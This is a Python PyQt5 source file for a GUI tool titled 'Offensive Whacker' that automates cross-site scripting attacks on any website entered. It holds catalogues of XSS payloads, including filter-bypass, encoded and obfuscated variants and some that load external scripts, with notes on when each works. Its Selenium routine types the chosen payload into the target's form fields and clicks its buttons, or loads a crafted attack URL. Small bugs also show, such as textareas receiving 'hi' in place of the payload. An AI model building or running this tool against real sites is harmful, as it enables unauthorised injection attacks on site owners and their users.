import sys
from PyQt5.QtWidgets import QMainWindow, QApplication,  QPushButton, QLineEdit,  QLabel, \
    QCheckBox, QListWidget,  QTextEdit, QRadioButton
from PyQt5.QtGui import QTextCursor
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import cgitb

cgitb.enable(format='text')


class App(QMainWindow):

    def __init__(self):
        super().__init__()
        self.title = 'Offensive Whacker'
        self.left = 100
        self.top = 20
        self.width = 900
        self.height = 450
        self.initUI()

    def initUI(self):
        self.setWindowTitle(self.title)
        self.setGeometry(self.left, self.top, self.width, self.height)

        # Create crafting payload label & textbox
        self.craftingPayloadLabel = QLabel("Craft XXS Payload: ", self)
        self.craftingPayloadLabel.move(60, 60)
        self.craftingPayloadTextbox = QTextEdit(self)
        self.craftingPayloadTextbox.move(10, 90)
        self.craftingPayloadTextbox.resize(200, 60)

        # creating description of payload label & scrollable textarea
        self.payloadDesLabel = QLabel("Description: ", self)
        self.payloadDesLabel.move(630, 160)
        self.payloadDesOutput = QTextEdit(self)
        self.payloadDesOutput.setReadOnly(True)
        self.payloadDesOutput.setLineWrapMode(QTextEdit.NoWrap)
        font = self.payloadDesOutput.font()
        font.setFamily("Courier")
        font.setPointSize(2)
        self.payloadDesOutput.moveCursor(QTextCursor.End)
        self.payloadDesOutput.setCurrentFont(font)

        self.payloadDesOutput.insertPlainText("")
        sb = self.payloadDesOutput.verticalScrollBar()
        sb.setValue(sb.maximum())
        self.payloadDesOutput.move(630, 190)
        self.payloadDesOutput.resize(240, 100)

        # creating label and scrollable textarea for log
        self.loglabel = QLabel("Logs: ", self)
        self.loglabel.move(470, 300)
        self.loglabel.resize(150, 15)
        self.logOutput = QTextEdit(self)
        self.logOutput.setReadOnly(True)
        self.logOutput.setLineWrapMode(QTextEdit.NoWrap)
        font = self.logOutput.font()
        font.setFamily("Courier")
        font.setPointSize(10)
        self.logOutput.moveCursor(QTextCursor.End)
        self.logOutput.setCurrentFont(font)

        self.logOutput.insertPlainText("")
        sb = self.logOutput.verticalScrollBar()
        sb.setValue(sb.maximum())
        self.logOutput.move(220, 320)
        self.logOutput.resize(500, 120)

        # creating radio button
        self.attackFormatlabel = QLabel('Attack Format:', self)
        self.attackFormatlabel.move(720, 60)
        self.rbtn1 = QRadioButton('Website Input-Fields', self)
        self.rbtn1.move(720, 80)
        self.rbtn1.resize(130, 30)
        self.rbtn2 = QRadioButton('URL', self)
        self.rbtn2.move(720, 100)
        self.rbtn1.toggled.connect(self.onClickedRadio)
        self.rbtn2.toggled.connect(self.onClickedRadio)

        # creating payload list & payload label
        self.xxslistlabel = QLabel("Select XXS Payload Commands: ", self)
        self.xxslistlabel.move(320, 67)
        self.xxslistlabel.resize(200, 15)
        self.xxsPayloadlist = QListWidget(self)
        self.xxsPayloadlist.move(220, 90)
        self.xxsPayloadlist.resize(360, 200)
        self.xxsPayloadlist.clicked.connect(self.onClickedPayloadList)

        # creating checkbox & checkbox label
        self.xxslabel = QLabel("XXS Type: ", self)
        self.xxslabel.move(630, 60)
        self.checkbox_A = QCheckBox('Basic', self)
        self.checkbox_A.stateChanged.connect(self.checkbox_a_click)
        self.checkbox_B = QCheckBox('Advance', self)
        self.checkbox_B.stateChanged.connect(self.checkbox_b_click)
        self.checkbox_C = QCheckBox('Filter Bypass', self)
        self.checkbox_C.stateChanged.connect(self.checkbox_c_click)
        self.checkbox_A.move(630, 80)
        self.checkbox_B.move(630, 100)
        self.checkbox_C.move(630, 120)

        # Create enter website label
        self.enterWebsitelabel = QLabel("Enter Website: ", self)
        self.enterWebsitelabel.move(220, 20)

        # Create website textbox
        self.websiteTextbox = QLineEdit(self)
        self.websiteTextbox.move(310, 20)
        self.websiteTextbox.resize(300, 30)

        # Create attack button
        self.button = QPushButton('Attack', self)
        self.button.move(630, 20)
        self.button.clicked.connect(self.onClickedAttackBtn)
        self.show()

    def onClickedRadio(self):
        if self.rbtn2.isChecked():
            self.craftingPayloadTextbox.setText(
                str(self.websiteTextbox.text()) + '(example: /search?q=)' + self.xxsPayloadlist.currentItem().text())
        elif self.rbtn1.isChecked():
            self.craftingPayloadTextbox.setText(self.xxsPayloadlist.currentItem().text())

    def onClickedPayloadList(self):
        currentItemText = self.xxsPayloadlist.currentItem().text()
        self.craftingPayloadTextbox.setText(currentItemText)
        if currentItemText == "<svg onload=alert(1)>" or currentItemText == "“><svg onload=alert(1)>":
            self.payloadDesOutput.clear()
            payloadDesText = "HTML Context — Simple Tag Injection\n---------------------------------------------\nUse " \
                             "when input lands inside an attribute’s \nvalue of an HTML tag or outside tag except " \
                             "\nthe ones described in next case. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
            print(self.xxsPayloadlist.currentItem().text())
        elif currentItemText == "</tag><svg onload=alert(1)>" or currentItemText == "“></tag><svg onload=alert(1)>":
            self.payloadDesOutput.clear()
            payloadDesText = "HTML Context — In Block Tag " \
                             "Injection\n---------------------------------------------\nUse when input lands inside " \
                             "or between opening/closing\nof the following " \
                             "tags:<title><style><script><textarea>\n<noscript><pre><xmp> and <iframe> (</tag> is " \
                             "accordingly). "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "javascript:alert(1)" or currentItemText == "data:text/html,<svg onload=alert(1)>":
            self.payloadDesOutput.clear()
            payloadDesText = "HTML Context — Source Injection\n---------------------------------------------\nUse " \
                             "when input lands as a value of the following HTML tag attributes: href, src, " \
                             "data\nor action (also formation). For src in script tag use an external script call (" \
                             "URL) or\n“data:,alert(1)”. 2nd payload below alerts out of target’s context for Webkit " \
                             "browsers. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "‘}alert(1);{‘" or currentItemText == "‘}alert(1)%0A{‘" or currentItemText == "\’}alert(1);{//"):
            self.payloadDesOutput.clear()
            payloadDesText = "Javascript Context — Code Injection in Logical " \
                             "Block\n---------------------------------------------\nUse 1st or 2nd payloads when " \
                             "input lands in a script block, inside a string delimited\nvalue and inside a single " \
                             "logical block like function or conditional (if, else, etc). If\nquote is escaped with a " \
                             "backslash, use 3rd payload. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "</script><svg onload=alert(1)>"):
            self.payloadDesOutput.clear()
            payloadDesText = "Javascript Context — Tag Injection\n---------------------------------------------\nUse " \
                             "when input lands anywhere in a script block. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "‘>alert(1)</script><script/1=’" or currentItemText == "*/alert(1)</script><script"
                                                                                          ">/*" or currentItemText ==
                "‘onload=alert(1)><svg/1=’"):
            self.payloadDesOutput.clear()
            payloadDesText = "Multi Reflection — Double Reflection (Single " \
                             "Input)\n---------------------------------------------\nUse to take advantage of " \
                             "multiple reflections on same page. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "*/alert(1)”>’onload=”/*<svg/1=’" or currentItemText == "`-alert("
                                                                                           "1)”>’onload=”`<svg/1=’"
                or currentItemText == "*/</script>’>alert(1)/*<script/1=’"):
            self.payloadDesOutput.clear()
            payloadDesText = "Multi Reflection — Triple Reflection (Single " \
                             "Input)\n---------------------------------------------\nUse to take advantage of " \
                             "multiple reflections on same page. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "p=<svg/1=’&q=’onload=alert(1)>" or currentItemText == "p=<svg 1=’&q=’onload=’/*&r"
                                                                                          "=*/alert(1)’>"):
            self.payloadDesOutput.clear()
            payloadDesText = "Multi Input Reflections (Double & " \
                             "Triple)\n---------------------------------------------\nUse to take advantage of " \
                             "multiple input reflections on same page. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "<svg xmlns='http://www.w3.org/2000/svg' onload=”alert(1)”/>":
            self.payloadDesOutput.clear()
            payloadDesText = "File Upload Injection — SVG File\n---------------------------------------------\nUse to " \
                             "create a stored XSS on target when uploading \nimage files. Save content below as " \
                             "“xss.svg”. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "<img src=1 onerror=alert(1)>" or currentItemText == "<iframe src=javascript"
                                                                                        ":alert(1)>"):
            self.payloadDesOutput.clear()
            payloadDesText = "DOM Insert Injection\n---------------------------------------------\nUse to test for " \
                             "XSS when injection gets inserted into DOM as valid \nmarkup instead of being reflected " \
                             "in source code. It works for \ncases where script tag and other vectors won’t work. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "data:text/html,<img src=1 onerror=alert(1)>" or currentItemText == "data:text"
                                                                                                       "/html,"
                                                                                                       "<iframe "
                                                                                                       "src=javascript:alert(1)>"):
            self.payloadDesOutput.clear()
            payloadDesText = "DOM Insert Injection — Resource " \
                             "Request\n---------------------------------------------\nUse when javascript code of the " \
                             "page inserts into page the results \nof a request to an URL controlled by attacker (" \
                             "injection). "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "<iframe src=TARGET_URL onload=”frames[0].postMessage(‘INJECTION’,’*’)”>":
            self.payloadDesOutput.clear()
            payloadDesText = "Javascript postMessage() DOM Injection (with " \
                             "Iframe)\n---------------------------------------------\nUse when there’s a “message” " \
                             "event listener like in\n“window.addEventListener(‘message’, …)” in javascript code " \
                             "without a check for\norigin. Target must be able to be framed (X-Frame Options header " \
                             "according to\ncontext). Save as HTML file (or using data:text/html) providing " \
                             "TARGET_URL and\nINJECTION (a XSS vector or payload). "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "<Svg OnLoad=alert(1)>" or currentItemText == "<Script>alert(1)</Script>":
            self.payloadDesOutput.clear()
            payloadDesText = "Mixed Case XSS\n---------------------------------------------\nUse to bypass " \
                             "case-sensitive filters. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "<svg onload=alert(1)//" or currentItemText == "<svg onload=”alert(1)”":
            self.payloadDesOutput.clear()
            payloadDesText = "Unclosed Tags\n---------------------------------------------\nUse in HTML injections to " \
                             "avoid filtering based in the presence of both lower than (<)\nand greater than (>) " \
                             "signs. It requires a native greater than \nsign in source code after input reflection. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>" or currentItemText == "<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>"):
            self.payloadDesOutput.clear()
            payloadDesText = "Uppercase XSS\n---------------------------------------------\nUse when application " \
                             "reflects input in uppercase. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E%2522%253E%253Csvg%2520o"
                                   "%256Enoad%253Dalert%25281%2529%253E"):
            self.payloadDesOutput.clear()
            payloadDesText = "Double Encoded XSS\n---------------------------------------------\nUse when application " \
                             "performs double decoding of input. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "alert`1`":
            self.payloadDesOutput.clear()
            payloadDesText = "Alert without Parentheses (Strings " \
                             "Only)\n---------------------------------------------\nUse in an HTML vector or " \
                             "javascript injection when parentheses \nare not allowed and a simple alert box is " \
                             "enough. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "[][‘\\146\\151\\154\\164\\145\\162’]["
                                   "‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’] "
                                   "(‘\\141\\154\\145\\162\\164\\50\\61\\51’)()"):
            self.payloadDesOutput.clear()
            payloadDesText = "Alert without Alphabetic Chars\n---------------------------------------------\nUse when " \
                             "alphabetic characters are not allowed. Following is alert(1). "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "(alert)(1)" or currentItemText == "a=alert,a(1)" or currentItemText == "[1].find(alert)"
                or currentItemText == "top[“al”+”ert”](1)" or currentItemText == "top[/al/.source+/ert/.source](1)" or currentItemText == "al\\u0065rt(1)"
                or currentItemText == "top[‘al\\145rt’](1)" or currentItemText == "top[8680439..toString(30)](1)"):
            self.payloadDesOutput.clear()
            payloadDesText = "Alert Obfuscation\n---------------------------------------------\nUse to trick several " \
                             "regular expression (regex) filters. It might be combined with\nprevious alternatives (" \
                             "above). The shortest option “top” can also be replaced by\n“window”, “parent”, " \
                             "“self” or “this” depending on context. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "<script src=data:,alert(1)>" or currentItemText == "<script src=//brutelogic.com"
                                                                                       ".br/1.js>"):
            self.payloadDesOutput.clear()
            payloadDesText = "Script Injection — No Closing\n---------------------------------------------\nUse when " \
                             "there’s a closing script tag (</script>) \nsomewhere in the code after reflection. "
            self.payloadDesOutput.insertPlainText(payloadDesText)

    # Create or clear Basic XXS payload list
    def checkbox_a_click(self):
        if not self.checkbox_A.isChecked():
            self.xxsPayloadlist.clear()
        else:
            self.xxsPayloadlist.insertItem(0, "Basic XXS: ")
            self.xxsPayloadlist.insertItem(1, "<svg onload=alert(1)>")
            self.xxsPayloadlist.insertItem(2, "“><svg onload=alert(1)>")
            self.xxsPayloadlist.insertItem(3, "</tag><svg onload=alert(1)>")
            self.xxsPayloadlist.insertItem(4, "“></tag><svg onload=alert(1)>")
            self.xxsPayloadlist.insertItem(5, "javascript:alert(1)")
            self.xxsPayloadlist.insertItem(6, "data:text/html,<svg onload=alert(1)>")
            self.xxsPayloadlist.insertItem(7, "‘}alert(1);{‘")
            self.xxsPayloadlist.insertItem(8, "‘}alert(1)%0A{‘")
            self.xxsPayloadlist.insertItem(9, "\’}alert(1);{//")
            self.xxsPayloadlist.insertItem(10, "</script><svg onload=alert(1)>")

    # Create or clear Advance XXS payload list
    def checkbox_b_click(self):
        if not self.checkbox_B.isChecked():
            self.xxsPayloadlist.clear()
        else:
            self.xxsPayloadlist.insertItem(0, "Advance XXS: ")
            self.xxsPayloadlist.insertItem(1, "‘onload=alert(1)><svg/1=’")
            self.xxsPayloadlist.insertItem(2, "‘>alert(1)</script><script/1=’")
            self.xxsPayloadlist.insertItem(3, "*/alert(1)</script><script>/*")
            self.xxsPayloadlist.insertItem(4, "*/alert(1)”>’onload=”/*<svg/1=’")
            self.xxsPayloadlist.insertItem(5, "`-alert(1)”>’onload=”`<svg/1=’")
            self.xxsPayloadlist.insertItem(6, "*/</script>’>alert(1)/*<script/1=’")
            self.xxsPayloadlist.insertItem(7, "p=<svg/1=’&q=’onload=alert(1)>")
            self.xxsPayloadlist.insertItem(8, "p=<svg 1=’&q=’onload=’/*&r=*/alert(1)’>")
            self.xxsPayloadlist.insertItem(9, "`<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>")
            self.xxsPayloadlist.insertItem(10, "<script src=data:,alert(1)>")
            self.xxsPayloadlist.insertItem(11, "<script src=//brutelogic.com.br/1.js>")
            self.xxsPayloadlist.insertItem(12, "<iframe src=javascript:alert(1)>")
            self.xxsPayloadlist.insertItem(13, "<iframe src=javascript:alert(1)>")
            self.xxsPayloadlist.insertItem(14, "data:text/html,<img src=1 onerror=alert(1)>")
            self.xxsPayloadlist.insertItem(15, "data:text/html,<iframe src=javascript:alert(1)>")
            self.xxsPayloadlist.insertItem(16,
                                           "<iframe src=TARGET_URL onload=”frames[0].postMessage(‘INJECTION’,’*’)”>")

    # Create or clear Filter Bypass XXS payload list
    def checkbox_c_click(self):
        if not self.checkbox_C.isChecked():
            self.xxsPayloadlist.clear()
        else:
            self.xxsPayloadlist.insertItem(0, "Filter Bypass XXS: ")
            # more
            self.xxsPayloadlist.insertItem(1, "<Svg OnLoad=alert(1)>")
            self.xxsPayloadlist.insertItem(2, "<Script>alert(1)</Script>")
            self.xxsPayloadlist.insertItem(3, "<svg onload=alert(1)//")
            self.xxsPayloadlist.insertItem(4, "<svg onload=”alert(1)”")
            self.xxsPayloadlist.insertItem(5, "<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>")
            self.xxsPayloadlist.insertItem(6, "<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>")
            self.xxsPayloadlist.insertItem(7, "%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E")
            self.xxsPayloadlist.insertItem(8, "%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E")
            self.xxsPayloadlist.insertItem(9, "alert`1`")
            self.xxsPayloadlist.insertItem(10,
                                           "[][‘\\146\\151\\154\\164\\145\\162’]["
                                           "‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’] "
                                           "(‘\\141\\154\\145\\162\\164\\50\\61\\51’)()")
            self.xxsPayloadlist.insertItem(11, "(alert)(1)")
            self.xxsPayloadlist.insertItem(12, "a=alert,a(1)")
            self.xxsPayloadlist.insertItem(13, "[1].find(alert)")
            self.xxsPayloadlist.insertItem(14, "top[“al”+”ert”](1)")
            self.xxsPayloadlist.insertItem(15, "top[/al/.source+/ert/.source](1)")
            self.xxsPayloadlist.insertItem(16, "al\\u0065rt(1)")
            self.xxsPayloadlist.insertItem(17, "top[‘al\\145rt’](1)")
            self.xxsPayloadlist.insertItem(18, "top[8680439..toString(30)](1)")

    def onClickedAttackBtn(self):
        # Open Chrome, automate input value and button click. Write to log the process
        if (self.rbtn1.isChecked()):
            self.logOutput.insertPlainText("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            self.logOutput.insertPlainText("\nStart Attacking................")
            sb = self.logOutput.verticalScrollBar()
            sb.setValue(sb.maximum())

            driver = webdriver.Chrome('./chromedriver')

            self.logOutput.insertPlainText("\nVisiting " + str(self.websiteTextbox.text()))
            sb = self.logOutput.verticalScrollBar()
            sb.setValue(sb.maximum())

            driver.get(self.websiteTextbox.text())
            print(driver.title)
            self.logOutput.insertPlainText("\nAutomating Input Fields attack on " + str(self.websiteTextbox.text()))

            sb = self.logOutput.verticalScrollBar()
            sb.setValue(sb.maximum())
            getbuttons = driver.find_elements(By.XPATH,
                                              '//form//button[contains(@class, "Button") or contains(@class, "button")]')
            getinputs = driver.find_elements(By.XPATH,
                                             '//form//input[not(@aria-label)][contains(@class, "Field") or contains('
                                             '@class, "field") '
                                             'or contains(@type, "email")  or contains(@type, "password") '
                                             'or contains(@type, "text") or contains(@type, "search")'
                                             'and not(contains(@type, "hidden"))]')
            gettextareas = driver.find_elements(By.XPATH,
                                                '//form//textarea[contains(@class, "Text") or contains(@class, "text")]')
            seletedpayload = self.craftingPayloadTextbox.toPlainText()

            for getinput in getinputs:
                self.logOutput.insertPlainText("\nInputting payload: " + str(
                    self.xxsPayloadlist.currentItem().text()) + " to input with class: " + str(
                    getinput.get_attribute("class")))
                print(getinput.get_attribute("class"))
                getinput.send_keys(seletedpayload)
                time.sleep(1)

            for gettextarea in gettextareas:
                self.logOutput.insertPlainText(
                    "\nInputting payload: " + str(
                        self.xxsPayloadlist.currentItem().text()) + " to textarea class: " + str(
                        gettextarea.get_attribute("class")))
                gettextarea.send_keys("hi")
                time.sleep(1)

            for getbutton in getbuttons:
                self.logOutput.insertPlainText(
                    "\nClicking on button with class: " + str(getinput.get_attribute("class")))
                getbutton.click()
                time.sleep(5)

            self.logOutput.insertPlainText("\nFinished attacking on " + str(self.websiteTextbox.text()))

            self.logOutput.insertPlainText("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

        elif (self.rbtn2.isChecked()):
            self.logOutput.insertPlainText("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            self.logOutput.insertPlainText("\nStart Attacking................")
            driver = webdriver.Chrome('./chromedriver')
            self.logOutput.insertPlainText("\nAutomating URL attack: " + str(self.craftingPayloadTextbox.toPlainText()))
            driver.get(self.craftingPayloadTextbox.toPlainText())
            self.logOutput.insertPlainText("\nFinished attacking on " + str(self.websiteTextbox.text()))
            self.logOutput.insertPlainText("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            time.sleep(5)


if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = App()
    sys.exit(app.exec_())
